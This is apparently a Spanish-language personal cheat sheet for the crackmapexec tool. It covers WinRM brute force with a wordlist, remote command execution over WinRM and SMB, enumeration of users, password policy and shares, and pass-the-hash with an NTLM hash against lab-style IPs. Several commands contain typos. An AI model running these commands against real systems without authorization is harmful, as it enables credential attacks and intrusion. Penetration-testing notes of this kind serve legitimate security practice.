**Realiza una enumeración de red e identifica hosts y servicios, al mismo tiempo que enumera recursos compartidos, usuarios y grupos dentro de la red**
puede usarse con protocolos como mssql, smb, winrm, ssh

**Funcion WINRM**
```
fuerza bruta con winrm (puerto 5985, 5986 con ssl):
 -> crackmapexec winrm 192.168.100.1 -u administrator -p /usr/share/rockyou.txt
ejecutar comandos con winrm:
 -> crackmapexec winrm 192.168.100.1 -u adminsitrator -p contraseña -x "whoami"
```

-----------------
**Funcion SMB**
```
Listar usuarios:
 -> crackmapexe smb 10.201.68.142 -u 'ybob317' -p 'ybob317' --users
Listar politicas de contraseña:
 -> crackmapexe smb 10.201.68.142 -u 'ybob317' -p 'ybob317' --pass-pol
Listar shares del smb:
 -> crackmapexec smb 10.201.68.142 -u 'ybob317' -p 'ybob317' --shares
Ejecutar comandos:
 -> crackmapexe smb 10.201.68.142 -u 'ybob317' -p 'ybob317' -x ipconfig
```

*se puede realizar pass the hash, usando el hash NTLM*
```
crackmapexec smb 10.201.68.142 -u 'ybob317' -H 'aeodaj2o123asdasdadkl2' -x "ifconfig"
```

